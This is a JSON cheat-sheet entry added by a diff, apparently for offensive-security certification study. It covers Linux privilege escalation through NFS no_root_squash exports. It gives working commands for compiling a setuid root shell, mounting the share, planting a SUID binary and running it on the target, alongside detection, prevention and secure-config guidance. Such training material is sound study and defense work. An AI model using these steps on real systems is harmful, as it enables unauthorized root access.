@@ -1,0 +1,110 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "nfs",
+    "gcc"
+  ],
+  "tags": [
+    "nfs",
+    "no_root_squash",
+    "suid"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Miscellaneous",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "List the target's NFS exports",
+      "command": "showmount -e <ip>"
+    },
+    {
+      "label": "Confirm no_root_squash in the exports",
+      "command": "cat /etc/exports"
+    },
+    {
+      "label": "On attacker (root): build a setuid /bin/bash dropper",
+      "command": "gcc shell.c -o shell   # main(){setuid(0);setgid(0);system(\"/bin/bash\");}"
+    },
+    {
+      "label": "Mount the share and plant the SUID binary as root",
+      "command": "sudo mount -t nfs <ip>:/<share> /mnt; cp shell /mnt; chmod u+s /mnt/shell"
+    },
+    {
+      "label": "Run it on the target - executes as root",
+      "command": "./shell"
+    }
+  ],
+  "notes": "root_squash maps root->nfsnobody (safe); no_root_squash keeps root (exploitable).",
+  "references": [
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "find-suid-sgid",
+      "note": "SUID abuse is the local-only sibling.",
+      "rel": "alternative"
+    },
+    {
+      "id": "passwd-write-lpe",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "nfs-no-root-squash",
+  "name": "Misc - NFS no_root_squash SUID Abuse",
+  "command": "sudo mount -t nfs <ip>:/<share> /mnt",
+  "description": "An NFS export with no_root_squash lets a root-owned SUID binary you create as root on your box run as root on the target. Mount the share, plant a SUID shell, execute it on the target.",
+  "steps": [
+    {
+      "label": "1. Enumerate exports",
+      "command": "showmount -e 10.129.2.12\ncat /etc/exports   # look for no_root_squash"
+    },
+    {
+      "label": "2. Build SUID shell (attacker as root)",
+      "command": "# shell.c: int main(){ setuid(0); setgid(0); system(\"/bin/bash\"); }\ngcc shell.c -o shell"
+    },
+    {
+      "label": "3. Mount, plant SUID, execute on target",
+      "command": "sudo mount -t nfs 10.129.2.12:/tmp /mnt\ncp shell /mnt\nchmod u+s /mnt/shell\n# on target:\n./shell"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1548.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "When an NFS share is exported with 'no_root_squash', the NFS server treats the client's root user as root on the server share (no UID mapping). An attacker who can mount the share as root on their own machine can create SUID binaries owned by root, then execute them on the target to gain root privileges.",
+    "prerequisites": "NFS share exported with no_root_squash in /etc/exports. Attacker has network access to the NFS port (2049) and root on their own machine to create SUID binaries.",
+    "impact": "Root shell on the target via SUID binary planted on the NFS share. The target user executes the SUID binary, which runs setuid(0) and drops a root shell.",
+    "detection": "showmount queries to the target NFS server from external IPs. Unexpected mount of NFS share from non-server IP. New SUID binary appearing on NFS-mounted share. Auditd: execution of SUID binary from NFS mount path.",
+    "artifacts": "NFS server log (mount from attacker IP) | Auditd: SUID binary executed from NFS path | Process log: setuid(0) call from user process",
+    "prevention": "Never export NFS shares with no_root_squash unless strictly required. Use root_squash (default) which maps root to nfsnobody. Use nosuid mount option on NFS clients to prevent SUID execution from mounted shares. Restrict NFS exports to specific trusted host IPs only.",
+    "misconfiguration": "/etc/exports contains 'no_root_squash' for shares accessible to untrusted clients. NFS server does not restrict which hosts can mount the share.",
+    "vulnerable_config": "# /etc/exports -- vulnerable\n/tmp         *(rw,sync,no_root_squash)\n# * allows any host to mount; no_root_squash preserves root UID",
+    "secure_config": "# /etc/exports -- secure\n/tmp         10.10.10.0/24(rw,sync,root_squash,nosuid,nodev)\n# root_squash: maps remote root to nfsnobody\n# nosuid: SUID bits on mounted files are ignored\n# Restrict to specific subnet, not *",
+    "evasion": "Mount using showmount output to find the exported path. Transfer compiled shell binary via NFS mount from attacker's root shell.",
+    "sources": [
+      "HTB M25",
+      "MITRE T1548.001",
+      "MITRE T1210"
+    ]
+  }
+}
